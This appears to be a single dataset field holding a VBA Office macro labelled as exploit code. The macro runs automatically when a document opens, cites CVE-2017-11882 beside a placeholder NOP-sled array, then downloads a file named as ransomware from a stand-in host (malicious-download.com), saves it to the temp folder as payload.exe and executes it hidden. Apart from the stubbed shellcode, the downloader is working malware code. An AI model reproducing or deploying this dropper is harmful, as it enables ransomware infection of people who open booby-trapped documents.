technical_data.exploit_code_snippet:
Sub Document_Open()
    Dim shellcode() As Byte
    ' Shellcode that triggers CVE-2017-11882 vulnerability to execute payload
    shellcode = Array(&H90, &H90, &H90, &H90) ' NOP sled placeholder
    ' Code to allocate memory and execute shellcode
    ' Then download and execute ransomware payload
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("Microsoft.XMLHTTP")
    WinHttpReq.Open "GET", "http://malicious-download.com/ransomware.bin", False
    WinHttpReq.Send
    If WinHttpReq.Status = 200 Then
        Dim stream As Object
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write WinHttpReq.responseBody
        stream.SaveToFile Environ("TEMP") & "\payload.exe", 2
        stream.Close
        Shell Environ("TEMP") & "\payload.exe", vbHide
    End If
End Sub
